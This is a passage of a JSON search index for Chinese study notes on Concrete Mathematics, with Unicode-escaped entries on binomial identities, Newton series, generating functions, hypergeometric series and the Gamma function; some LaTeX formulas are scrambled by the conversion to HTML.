\u4e2a\u6052\u7b49\u5f0f","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u57fa\u672c\u7ec3\u4e60","title":"\u57fa\u672c\u7ec3\u4e60","text":"<p>\u95ee\u9898 1\uff1a\u6bd4\u503c\u7684\u548c\u5f0f $$ \\begin{align}  \\sum_{k=0}^{m} {m \\choose k}/{n \\choose k} &amp; = \\sum_{k \\ge 0} {n - k \\choose m - k}/{n \\choose m}\\   &amp;= 1/{n \\choose m}\\sum_{k \\le m} {n - m + k \\choose k}\\   &amp;= {n+1 \\choose m} /{n \\choose m} \\   &amp;= \\frac{n+1}{n+1-m} \\end{align} $$ \u95ee\u9898 2\uff1a $$ \\begin{align}  \\sum_{k=0}^{n} k{m -k - 1 \\choose m - n - 1} &amp; = \\sum_{k=0}^{n} (m - (m-k)){m -k - 1 \\choose m - n - 1}\\   &amp;= \\sum_{k=0}^{n} m{m -k - 1 \\choose m - n - 1} - \\sum_{k=0}^{n} (m-k){m -k - 1 \\choose m - n - 1}\\ \\end{align} $$ \u95ee\u9898 6\uff1a</p> <p>\\(n \\ge 0\\) $$ \\begin{align}  \\sum_{k\\ge0} {n+k \\choose 2k}{2k \\choose k}\\frac{(-1)^k}{k+1} &amp; = \\sum_{k\\ge0}{n+k \\choose k}{n \\choose k}\\frac{(-1)^k}{k+1}\\   &amp;= \\sum_{k\\ge0}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\ \\end{align} $$ \u5bf9\u79f0\u6027 $$ \\begin{align}  \\sum_{k\\ge0}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1} &amp;= \\sum_{k}{n+k \\choose k}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\   &amp;= \\sum_{k}{n+k \\choose n}{n+1 \\choose k+1}\\frac{(-1)^k}{n+1}\\   &amp;= 0 \\end{align} $$ \u4ece\\({n+k \\choose k}\u53d8\u4e3a{n+k \\choose n}\\)\uff0c\u5f53\\(k&lt;-n\\)\u65f6\uff0c\u4f1a\u4ece\u4e00\u4e2a\u96f6\u503c\u53d8\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c\u3002\u4f46\u662f\u7531\u4e8e\u53e6\u4e00\u9879\\({n+1 \\choose k+1}\\)\u5728\\(k&lt;-n\\)\u65f6\u4e3a 0\uff0c\u9664\u4e86\\(n=0\\)\u65f6\\(k=-1\\)\u7684\u60c5\u51b5\u4e3a 1\uff0c\u56e0\u6b64\u7b54\u6848\u4e3a\\(0 - {-1 \\choose 0}(-1)^{-1} = 1\\)</p> <p>\u6216\u5219\u76f4\u63a5\u5229\u7528\u53cd\u8f6c\u4e0a\u6307\u6807</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5904\u7406\u7684\u6280\u5de7","title":"\u5904\u7406\u7684\u6280\u5de7","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53d6\u4e00\u534a","title":"\u53d6\u4e00\u534a","text":"\\[ \\begin{equation}     r^{\\underline{k}}(r-\\frac{1}{2})^{\\underline{k}}=(2 r)^{\\underline{2k}} / 2^{2 k} \\text {, \u6574\u6570 } k \\geqslant 0 \\end{equation} \\] \\[ \\begin{equation}     {r \\choose k}{r-1 / 2 \\choose k}={2 r \\choose 2 k}{2 k \\choose k} / 2^{2 k}, k \\text { \u662f\u6574\u6570\u3002} \\end{equation} \\] \\[ \\begin{equation}     {n-1 / 2 \\choose n}={2 n \\choose n} / 2^{2 n}, n \\text { \u662f\u6574\u6570\u3002} \\end{equation} \\] \\[ \\begin{equation}     {-1 / 2 \\choose n}=\\left(\\frac{-1}{4}\\right)^{n}{2 n \\choose n}, n \\text { \u662f\u6574\u6570\u3002} \\end{equation} \\] \\[ (2n-1)!! 2^nn!= (2n)! \\] <p>\u53ef\u4ee5\u77e5\u9053\uff0c\u5f53\u4e0a\u6307\u6807\u975e\u6574\u6570\u65f6\uff0c\u53d6\u503c\u5f88\u7279\u522b\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u9ad8\u9636\u5dee\u5206","title":"\u9ad8\u9636\u5dee\u5206","text":"\\[ \\begin{equation} \\Delta^{n}=(\\mathrm{E}-1)^{n}=\\sum_{k}{n \\choose k} \\mathrm{E}^{k}(-1)^{n-k} \\end{equation} \\] <p>\u5373 $$ \\sum_{k} {n \\choose k}(-1)^{n-k}f(x+k) = \\Delta^{n}f(x) $$ \u6216\\(\\sum_{0}^{n} {n \\choose k}(-1)^{k}f(x+k) = (-1)^n \\Delta^{n}f(x)\\)</p> <p>\u6216\\(\\sum_{0}^{n} {n \\choose k}(-1)^{k}f(k) = (-1)^n \\Delta^{n}f(0)\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u725b\u987f\u7ea7\u6570","title":"\u725b\u987f\u7ea7\u6570","text":"<p>\u5047\u5982 f(x) \u662f\u4e00\u4e2a d \u6b21\u591a\u9879\u5f0f\uff0c\u5219 f(x) \u53ef\u4ee5\u5199\u6210\u4e0b\u964d\u5e42\u7684\u548c\u5f0f $$ f(x) = b_dx^{\\underline{d}} + b_{d-1}x<sup>{\\underline{d-1}}+...+b_1x</sup> $$ \u66f4\u8fdb\u4e00\u6b65\uff0c\u53ef\u4ee5\u5199\u6210\u4e8c\u9879\u5f0f\u7cfb\u6570\u7684\u548c $$ f(x) = c_d{x \\choose d} + c_{d-1}{x \\choose d-1}+...+c_{0}{x \\choose 0} $$}} + b_0x^{\\underline{0}</p> <p>\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\u9ad8\u9636\u5dee\u5206\uff0c\u6c42\u89e3\u8fd9\u4e9b\u7cfb\u6570\u3002\u7c7b\u4f3c\u4e8e\u6cf0\u52d2\u5c55\u5f00\u3002 $$ \\Delta^{n} {x \\choose d} = {x \\choose d-n} $$</p> \\[ \\begin{equation} f(x)=\\Delta^{d} f(0){x \\choose d}+\\Delta^{d-1} f(0){x \\choose d-1}+\\cdots+\\Delta f(0){x \\choose 1}+f(0){x \\choose 0} \\end{equation} \\] \\[ \\begin{equation}     g(a+x)=\\frac{g(a)}{0 !} x^{\\underline{0}}+\\frac{\\Delta g(a)}{1 !} x^{\\underline{1}}+\\frac{\\Delta^{2} g(a)}{2 !} x^{\\underline{2}}+\\frac{\\Delta^{3} g(a)}{3 !} x^{\\underline{3}}+\\cdots \\end{equation} \\] <p>\u6bd4\u5982\u8981\u8ba1\u7b97\\(f(x) = x^3\\)\u7684\u725b\u987f\u7ea7\u6570 $$ f(0) = 0, f(1) = 1, f(2) = 8, f(3) = 27\\ \\Delta f(0) = 1, \\Delta f(1) = 7, \\Delta f(2) = 19,\\ \\Delta^2 f(0) = 6, \\Delta f(1) = 12,\\ \\Delta^3 f(0) = 6, $$ \u56e0\u6b64\\(x^3 = 6{x \\choose 3} + 6{x \\choose 2} + {x \\choose 1}\\)</p> <p>\u56e0\u6b64\\(\\sum_{k=0}^{n-1} k^3 = 6{n \\choose 4} + 6{n \\choose 3} + {n \\choose 2}\\)</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u53cd\u6f14","title":"\u53cd\u6f14","text":"\\[ \\begin{equation}     g(n)=\\sum_{k}{n \\choose k}(-1)^{k} f(k) \\Leftrightarrow f(n)=\\sum_{k}{n \\choose k}(-1)^{k} g(k) \\end{equation} \\] <p>\u4e66\u672c p159 \u5904\\(f(k) = {r - sk \\choose n} = \\frac{1}{n!}(-n)^n...\\)\u4e2d\u7684\\((-n)^n\\)\u5e94\u8be5\u662f\\((-1)^n\\)\uff0c\u5370\u5237\u9519\u8bef\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u751f\u6210\u51fd\u6570","title":"\u751f\u6210\u51fd\u6570","text":"<p>\u5377\u79ef</p> <p>\u751f\u6210\u51fd\u6570\u8ba1\u7b97</p> <p>B_2(z) \u7684\u7cfb\u6570\u4e3a\u5361\u5854\u5170\u6570 Catalan number C_n</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e7f\u4e49\u4e8c\u9879\u7ea7\u6570\u548c\u5e7f\u4e49\u6307\u6570\u7ea7\u6570","title":"\u5e7f\u4e49\u4e8c\u9879\u7ea7\u6570\u548c\u5e7f\u4e49\u6307\u6570\u7ea7\u6570","text":"\\[ \\begin{equation}     \\mathcal{B}_{t}(z)=\\sum_{k \\geqslant 0}(t k)^{\\frac{k-1}{}} \\frac{z^{k}}{k !} ; \\quad \\mathcal{E}_{t}(z)=\\sum_{k \\geqslant 0}(t k+1)^{k-1} \\frac{z^{k}}{k !} \\end{equation} \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e00\u822c\u5377\u79ef\u516c\u5f0f","title":"\u4e00\u822c\u5377\u79ef\u516c\u5f0f","text":"<ul> <li>\u6709\uff085.60\uff09</li> </ul> \\[ \\begin{aligned}     \\mathcal{B}_{t}(z)^{r}=\\sum_{k \\geqslant 0}{t k+r \\choose k} \\frac{r}{t k+r} z^{k} ; \\\\     &amp; \\mathcal{E}_{t}(z)^{r}=\\sum_{k \\geqslant 0} r \\frac{(t k+r)^{k-1}}{k !} z^{k} ;     \\end{aligned} $$ \u53ef\u8bb0\u5176\u4e2d\u7684\u7cfb\u6570\uff1a $$ C_{k}^{(t,r)} = {tk+r \\choose k}\\frac{1}{tk+r} \\] <p>\u5982 $$ (t k)^{\\underline{k-1}}\\frac{1}{k!} = (tk+1)^{\\underline{k}}/(tk+1)\\frac{1}{k!} = C_k^{(t, 1)} $$ \u4e4b\u540e\u4f1a\u8bc1\u660e\uff1a $$ [z^k]\\mathcal{B}_t(z) = [z<sup>{k-1}]\\mathcal{B}_t(z)</sup>t $$</p> <ul> <li>\u53c8\u6709 (5.61)</li> </ul> \\[ \\begin{aligned}     \\frac{\\mathcal{B}_{t}(z)^{r}}{1-t+t \\mathcal{B}_{t}(z)^{-1}}=\\sum_{k \\geqslant 0}{t k+r \\choose k} z^{k} ; \\\\     &amp; \\frac{\\mathcal{E}_{t}(z)^{r}}{1-z t \\mathcal{E}_{t}(z)^{t}}=\\sum_{k \\geqslant 0} \\frac{(t k+r)^{k}}{k !} z^{k} .     \\end{aligned} \\] <p>\u6784\u9020\u751f\u6210\u51fd\u6570\\(\\mathcal{B}_{t}(z)^{r}  \\frac{\\mathcal{B}_{t}(z)^{s}}{1-t+t \\mathcal{B}_{t}(z)^{-1}}\\)\uff0c\u5f97\u4e00\u822c\u5377\u79ef\u516c\u5f0f (5.62)\uff1a $$ \\begin{equation}     \\sum_{k}{t k+r \\choose k}{t n-t k+s \\choose n-k} \\frac{r}{t k+r}={t n+r+s \\choose n} \\end{equation} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u7279\u6b8a\u7ea7\u6570sqrt1pm4z","title":"\u7279\u6b8a\u7ea7\u6570\\(\\sqrt{1\\pm4z}\\)","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#b_2-\u5c01\u95ed\u5f62\u5f0f-568\u4e66\u4e0a\u6ca1\u6709\u8bc1\u660e","title":"B_2 \u5c01\u95ed\u5f62\u5f0f (5.68)\uff08\u4e66\u4e0a\u6ca1\u6709\u8bc1\u660e\uff09","text":"\\[ \\mathcal{B}_{2}(z)=\\sum_{k}{2 k \\choose k} \\frac{z^{k}}{1+k}=\\sum_{k}{2 k+1 \\choose k} \\frac{z^{k}}{1+2 k}=\\frac{1-\\sqrt{1-4 z}}{2 z} $$ \u8bc1\u660e\uff1a $$ \\begin{align} \\sqrt{1-4z} &amp;= (1-4z)^{1/2}\\\\  &amp;=\\sum_{k\\ge 0}{1/2 \\choose k}(-4z)^k \\\\  &amp;{\\text{\u6709${-1/2 \\choose k} = (-1/4)^k{2k \\choose k}$}}\\\\  &amp;= \\sum_{k\\ge 0}\\frac{1/2(1/2-1)...}{k!}(-4z)^k \\\\  &amp;= 1+\\sum_{k\\ge 1}\\frac{1}{2k}\\frac{(-1/2)^{\\underline{k-1}}}{(k-1)!}(-4z)^k \\\\  &amp;= 1 + \\sum_{k\\ge 1}{-1/2 \\choose k-1}(-4z)^k \\\\  &amp;= 1 + \\sum_{k\\ge 0}{-1/2 \\choose k}(-4z)^{k+1} \\\\  &amp;= 1 - 2z\\sum_{k\\ge 0}{2 k \\choose k}\\frac{1}{k+1}z^k  &amp;= 1 - 2zB_2(z) \\end{align} \\] <p>\u8bc1\u660e (5.72) $$ \\begin{equation}     \\frac{\\mathcal{B}{2}(z)^{r}}{\\sqrt{1-4 z}}=\\sum \\end{equation} $$ \u8bc1\u660e\uff1a}{2 k+r \\choose k} z^{k</p> <p>\u6709\uff08\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u8bc1\u660e\uff09 $$ \\frac{1}{\\sqrt{1-4z}} = \\sum_{k}{2k \\choose k} z^k $$ \u6784\u9020\u751f\u6210\u51fd\u6570\\(\\mathcal{B}_{2}(z)^{r} \\frac{1}{\\sqrt{1-4z}}\\)\uff0c\u518d\u7531\u4e00\u822c\u5377\u79ef\u516c\u5f0f\u53ef\u5f97\u3002</p> <p>\u7c7b\u4f3c\u53ef\u5f97 (5.73) $$ \\begin{equation}     \\frac{\\mathcal{B}{-1}(z)^{r+1}}{\\sqrt{1+4 z}}=\\sum \\end{equation} $$ }{r-k \\choose k} z^{k\u8bc1\u660e (5.74) $$ \\begin{equation}     \\sum_{k \\leqslant n}{n-k \\choose k} z^{k}=\\frac{1}{\\sqrt{1+4 z}}\\left(\\left(\\frac{1+\\sqrt{1+4 z}}{2}\\right)^{n+1}-\\left(\\frac{1-\\sqrt{1+4 z}}{2}\\right)^{n+1}\\right) \\text {, \u6574\u6570 } n \\geqslant 0 \\end{equation} $$ \u8bc1\u660e\uff1a</p> <p>\u53ef\u8bc1\u660e k&gt;n \u65f6 $$ [z<sup>k]\\frac{(-z)</sup>}\\mathcal{B{2}(-z)^{n+1}}{\\sqrt{1+4 z}} = {n-k \\choose k} $$ \uff0c\u6545 $$ \\begin{equation} \\frac{\\mathcal{B}(z)<sup>{n+1}-(-z)</sup>} \\mathcal{B{2}(-z)^{n+1}}{\\sqrt{1+4 z}}=\\sum n-k \\ k \\end{array}\\right) z^{k} \\end{equation} $$}\\left(\\begin{array}{c</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u51fd\u6570","title":"\u8d85\u51e0\u4f55\u51fd\u6570","text":"\\[ \\begin{equation}     F\\left(\\left.\\begin{array}{c}     a_{1}, \\cdots, a_{m} \\\\     b_{1}, \\cdots, b_{n}     \\end{array}\\right| z\\right)=\\sum_{k \\geqslant 0} \\frac{a_{1}^{\\bar{k}} \\cdots a_{m}^{\\bar{k}} z^{k}}{b_{1}^{\\bar{k}} \\cdots b_{n}^{\\bar{k}} k !} \\end{equation} \\] <ul> <li>\u5e26\u6709 m \u4e2a\u4e0a\u53c2\u6570\uff0cn \u4e2a\u4e0b\u53c2\u6570\u3002\u5bf9\u4e8e\u53c2\u6570\u4e2a\u6570\u4e3a 0 \u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u4e0a\u4e0b\u6dfb\u52a0\u4e00\u4e2a\u5e38\u6570 1 \u800c\u4e0d\u4f1a\u5f71\u54cd\uff08\u53c2\u6570\u4e2a\u6570\u4ecd\u7136\u662f 0 \u4e2a\uff09\u3002</li> </ul> <ul> <li>\u5982 m=1, n=0 \u7684\u60c5\u51b5\u5bf9\u5e94</li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{c}     a, 1 \\\\     1     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} a^{\\bar{k}} \\frac{z^{k}}{k !}=\\sum_{k}{a+k-1 \\choose k} z^{k}=\\frac{1}{(1-z)^{a}} \\end{equation} \\] <ul> <li>m=0, n=1 \u4e3a\u4fee\u6b63\u8d1d\u585e\u5c14\u51fd\u6570\uff08modified Bessel function\uff09</li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{c}     1 \\\\     b, 1     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} \\frac{(b-1) !}{(b-1+k) !} \\frac{z^{k}}{k !}=I_{b-1}(2 \\sqrt{z}) \\frac{(b-1) !}{z^{(b-1) / 2}} \\end{equation} \\] <ul> <li>m=1, n=1 \u4e3a\u5408\u6d41\u8d85\u51e0\u4f55\u7ea7\u6570\uff08confluent hypergeometric series\uff09</li> </ul> \\[ \\begin{equation}     F\\left(\\begin{array}{l}     a \\\\     b     \\end{array} \\mid z\\right)=\\sum_{k \\geqslant 0} \\frac{a^{\\bar{k}}}{b^{\\bar{k}}} \\frac{z^{k}}{k !}=M(a, b, z) . \\end{equation} \\] <ul> <li>\u800c m=2, n=1 \u88ab\u79f0\u4e3a\u9ad8\u65af\u8d85\u51e0\u4f55\u51fd\u6570</li> </ul> <p>\u4eca\u5929\uff0c\u5728\u8bb8\u591a\u5927\u5b66 \u7684\u7269\u7406\u5b66\u3001\u5de5\u7a0b\u5b66\u751a \u81f3\u6570\u5b66\u4e13\u4e1a\u7684\u5b66\u751f \u6240\u5b66\u4e60\u7684\u51fd\u6570\u4e2d\uff0c\u5373 \u4f7f\u4e0d\u662f 100% \uff0c\u4e5f\u5fc5\u5b9a \u6709 95% \u7684\u51fd\u6570\u88ab\u8fd9\u5355 \u4e2a\u7684\u7b26\u53f7 F ( a , b ; c ; x ) \u6240\u6db5\u76d6\uff0e\u201d   \u2014\u2014 W.W. \u7d22\u8036 [318]</p> \\[ \\begin{equation}     \\left.F\\left(\\begin{array}{c}     a, b \\\\     c     \\end{array}\\right| z\\right)=\\sum_{k \\geqslant 0} \\frac{a^{\\bar{k}} b^{\\bar{k}} z^{k}}{c^{\\bar{k}} k !} . \\end{equation} \\] <p>\u200b \u6709\u975e\u5e38\u591a\u7684\u6027\u8d28\uff0c\u5982 $$ \\begin{align}     \\ln (1+z)=z F\\left(\\begin{array}{c}     1,1 \\     2     \\end{array} \\mid-z\\right) &amp;=z \\sum_{k \\geqslant 0} \\frac{k ! k !}{(k+1) !} \\frac{(-z)^{k}}{k !} \\     &amp;=z-\\frac{z<sup>{2}}{2}+\\frac{z</sup>+\\cdots \\end{align}}{3}-\\frac{z^{4}}{4} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8d85\u51e0\u4f55\u51fd\u6570\u8868\u793a","title":"\u8d85\u51e0\u4f55\u51fd\u6570\u8868\u793a","text":"<p>\u8d85\u51e0\u4f55\u7ea7\u6570\u6070\u597d\u5c31\u662f\u9996\u9879\u4e3a 1 \u4e14\u9879\u7684\u6bd4\u503c t k+1 /t k \u662f k \u7684\u6709\u7406\u51fd\u6570\u7684\u90a3\u4e9b\u7ea7\u6570 $$ \\begin{equation}     \\begin{aligned}     \\frac{t_{k+1}}{t_{k}} &amp;=\\frac{a_{1}^{\\overline{k+1}} \\cdots a_{m}<sup>{\\overline{k+1}}}{a_{1}</sup>}} \\cdots a_{m}^{\\bar{k}}} \\frac{b_{1}^{\\bar{k}} \\cdots b_{n<sup>{\\bar{k}}}{b_{1}</sup> \\frac{z}} \\cdots b_{n}^{\\overline{k+1}}} \\frac{k !}{(k+1) !<sup>{k+1}}{z</sup> \\     &amp;=\\frac{\\left(k+a_{1}\\right) \\ldots\\left(k+a_{m}\\right) z}{\\left(k+b_{1}\\right) \\ldots\\left(k+b_{n}\\right)(k+1)}     \\end{aligned} \\end{equation} $$}</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u5e73\u884c\u6c42\u548c\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570","title":"\u5e73\u884c\u6c42\u548c\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570","text":"<p>\u5e73\u884c\u6c42\u548c\uff1a $$ \\sum_{k\\le n} {r+k \\choose k} = \\sum_{k\\ge 0}{r +n -k \\choose n-k} = {r+n+1 \\choose n} $$ \u800c $$ \\frac{t_{k+1}}{t_k}= \\frac{(k+1)(k-n)(1)}{(k-n-r)(k+1)} \\ t_0 = {r+n \\choose n} $$ \u6545 $$ {r+n \\choose n} F(1, -n; -n-r; 1) = {r+n+1 \\choose n} $$ \u5373 $$ F(1, -n; -n-r; 1)=\\frac{r+n+1}{r+1} $$ \u7c7b\u4f3c\u7684\u53e6\u4e00\u4e2a\u6c42\u548c\u4e5f\u53ef\u4ee5\u8868\u793a\u4e3a\u8d85\u51e0\u4f55\u51fd\u6570\uff1a $$ \\sum_{k\\le m} {r \\choose k}(-1)^k = F(1, -m; -m+r+1; 1) $$ \u8fd9\u4e24\u4e2a\u8d85\u51e0\u4f55\u7ea7\u6570\u5747 m=1, n=1\uff0c\u53ef\u4ee5\u76f8\u4e92\u63a8\u51fa\u3002</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e24\u4e2a\u9650\u5236","title":"\u4e24\u4e2a\u9650\u5236","text":"<ul> <li> <p>\u4e0b\u53c2\u6570\u4e0d\u80fd\u4e3a 0 \u6216\u8005\u8d1f\u6574\u6570</p> <p>\u539f\u6765\u6211\u4eec\u662f\u5bf9\u6574 \u6570 r \u8bc1\u660e\u4e86\u8fd9\u4e9b\u6052\u7b49 \u5f0f\uff0c\u5e76\u7528\u591a\u9879\u5f0f\u63a8\u7406 \u6cd5\u6307\u51fa\u5b83\u4eec\u5728\u4e00\u822c \u60c5\u5f62\u4e5f\u6210\u7acb\uff0e \u73b0\u5728\u6211 \u4eec\u662f\u9996\u5148\u8bc1\u660e\u5b83\u4eec \u5bf9\u65e0\u7406\u6570 r \u6210\u7acb\uff0c\u5e76 \u5229\u7528\u6781\u9650\u65b9\u6cd5\u6307\u51fa \u5b83 \u4eec \u5bf9 \u6574 \u6570 \u4e5f \u6210\u7acb</p> </li> </ul> <ul> <li>\u4f7f\u7528\u9636\u4e58\u5c06\\({r+n-k \\choose n-k}\\)\u5c55\u5f00\u4e86\uff0c\u800c\u9636\u4e58\u539f\u672c\u5bf9\u8d1f\u6574\u6570\u65f6\u6ca1\u5b9a\u4e49\u3002</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u9636\u4e58\u63a8\u5e7f","title":"\u9636\u4e58\u63a8\u5e7f","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9","title":"\u6b27\u62c9","text":"<p>\u6240\u6709\u590d\u6570 z $$ \\frac{1}{z!} = \\lim_{n\\rightarrow \\infin} {n+z \\choose n}n^{-z} $$</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#gamma-\u51fd\u6570","title":"\\(\\Gamma \u51fd\u6570\\)","text":"\\[ z! = \\int_0^{\\infin}t^ze^{-t}dt, R_z&gt;-1 \\] <p>\u901a\u8fc7 $$ z! = z(z-1)! $$ \u5c06\u8be5\u5b9a\u4e49\u5ef6\u62d3\u5230\\(C - Z^-\\)\uff08\u9664\u4e86\u8d1f\u6574\u6570\u5916\u7684\u590d\u6570\uff09</p> <p>\u9636\u4e58\u548c\u4f3d\u9a6c\u51fd\u6570\u53ef\u4ee5\u76f8\u4e92\u66ff\u6362\u4f7f\u7528\u3002 $$ \\Gamma(z+1) = z!\\ (-z)!\\Gamma(z) = \\frac{\\pi}{\\sin{\\pi z}} $$ \u5e7f\u4e49\u9636\u4e58\u5e42 $$ z^{\\underline{w}} = \\frac{z!}{(z-w)!}\\ z^{\\bar{w}} = \\frac{\\Gamma(z+w)}{\\Gamma(z)}\\ $$ \u4e8c\u9879\u5f0f\u7cfb\u6570 $$ \\left(\\begin{array}{c} z \\ w \\end{array}\\right)=\\lim {\\zeta \\rightarrow z} \\lim  $$} \\frac{\\zeta !}{\\omega !(\\zeta-\\omega) !</p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u725b\u987f\u7ea7\u6570_1","title":"\u725b\u987f\u7ea7\u6570","text":"\\[ \\ln(x!) = \\sum_k a_k x^k \\]","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u8303\u5fb7\u8499\u5377\u79ef_1","title":"\u8303\u5fb7\u8499\u5377\u79ef","text":"\\[ \\left(\\begin{array}{c} s \\\\ n \\end{array}\\right) F\\left(\\begin{array}{c} -r,-n \\\\ s-n+1 \\end{array}\\right)=\\left(\\begin{array}{c} r+s \\\\ n \\end{array}\\right) \\] <p>\u5f97 $$ \\begin{equation}     F\\left(\\begin{array}{c}     a, b \\     c     \\end{array} \\mid 1\\right)=\\frac{\\Gamma(c-a-b) \\Gamma(c)}{\\Gamma(c-a) \\Gamma(c-b)} ; \\text { \u6574\u6570 } b \\leqslant 0 \\text {, \u6216\u8005 } \\mathfrak{c} c&gt;\\Re a+\\Re b . \\end{equation} $$ \u7279\u6b8a\u60c5\u5f62 $$ \\begin{equation} F\\left(\\begin{array}{c} a,-n \\ c \\end{array} \\mid 1\\right)=\\frac{(c-a)<sup>{\\bar{n}}}{c</sup>=\\frac{(a-c)}}<sup>{\\frac{n}{n}}}{(-c)</sup> n \\geqslant 0 \\end{equation} $$ \u56e0\u6b64\u57fa\u672c\u6240\u6709\u4e4b\u524d\u7684\u6c42\u548c\u516c\u5f0f\uff0c\u90fd\u53ef\u4ee5\u7528\u8fd9\u6761\u516c\u5f0f\u67e5\u8868\u7684\u65b9\u5f0f\u5f97\u5230\u3002}}, \\quad \\text { \u6574\u6570 </p>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6c42\u6781\u9650","title":"\u6c42\u6781\u9650","text":"<p>\u5df2\u77e5\u6709\uff08\u89c1 p177\uff09 $$ (-1)^{n} \\frac{(2 n) !}{n !}=\\lim {b \\rightarrow-2 n} \\frac{(b / 2) !}{b !}=\\lim  $$ \u56e0\u6b64} \\frac{x !}{(2 x) !\\(-6!/3!=\\lim_{x-&gt;-3}x!/(2x)!\\)</p> <ul> <li>\u5982\u679c\u8ba4\u4e3a (-3) = (-3)(-4)(-5)(-6)!\uff0c\u7136\u540e\u6d88\u6389\u5c31\u4f1a\u5f97\u5230\u9519\u8bef\u7b54\u6848</li> </ul> <ul> <li> 